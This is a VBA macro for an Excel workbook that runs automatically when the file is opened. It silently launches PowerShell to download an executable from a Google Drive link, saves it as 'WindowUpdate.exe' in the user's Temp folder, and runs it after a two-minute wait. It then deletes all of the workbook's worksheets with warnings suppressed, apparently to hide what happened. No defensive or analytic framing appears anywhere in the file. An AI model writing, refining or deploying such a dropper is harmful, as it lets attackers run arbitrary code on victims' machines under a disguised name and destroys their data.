
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)

Sub DownloadAndRunExeUsingPowerShell()
    Dim fileURL As String
    Dim filePath As String
    Dim tempDirectory As String
    Dim currentUser As String
    Dim psCommand As String
    Dim shell As Object
    Dim ws As Worksheet
    
    ' Direct download URL of the executable file
    fileURL = "https://drive.google.com/uc?export=download&id=17ldSThkA-1j06u9GAAclTsiYE8cRNvKY420BQuEeuc" ' Correct raw URL
    
    ' Get the current user's profile directory
    currentUser = Environ("USERNAME")
    tempDirectory = "C:\Users\" & currentUser & "\AppData\Local\Temp\"
    
    ' Full path of the file to be saved
    filePath = tempDirectory & "WindowUpdate.exe"
    
    ' PowerShell command to download the file
    psCommand = "powershell -command ""(New-Object Net.WebClient).DownloadFile('" & fileURL & "', '" & filePath & "')"""
    
    ' Execute the PowerShell command to download the file
    Set shell = CreateObject("WScript.Shell")
    shell.Run psCommand, 0, True ' Run and wait for completion
    
    ' Wait for 2 minutes (120,000 milliseconds)
    Sleep 120000
    
    ' Verify that the file has been downloaded
    If Dir(filePath) <> "" Then
        ' PowerShell command to execute the downloaded file
        psCommand = "powershell -command ""Start-Process -FilePath '" & filePath & "' -Wait"""
        
        ' Execute the PowerShell command to run the file
        shell.Run psCommand, 0, True ' Run and wait for completion
    Else
        MsgBox "Failed to download the file. File not found: " & filePath
    End If
    
    ' Delete the Excel sheet without warnings
    On Error Resume Next
    Application.DisplayAlerts = False
    For Each ws In ThisWorkbook.Worksheets
        ws.Delete
    Next ws
    Application.DisplayAlerts = True
    On Error GoTo 0
    
    ' Clean up
    Set shell = Nothing
End Sub

' Automatically run the macro when the workbook is opened
Private Sub Workbook_Open()
    ' Call the macro to be run on workbook open
    Call DownloadAndRunExeUsingPowerShell
End Sub

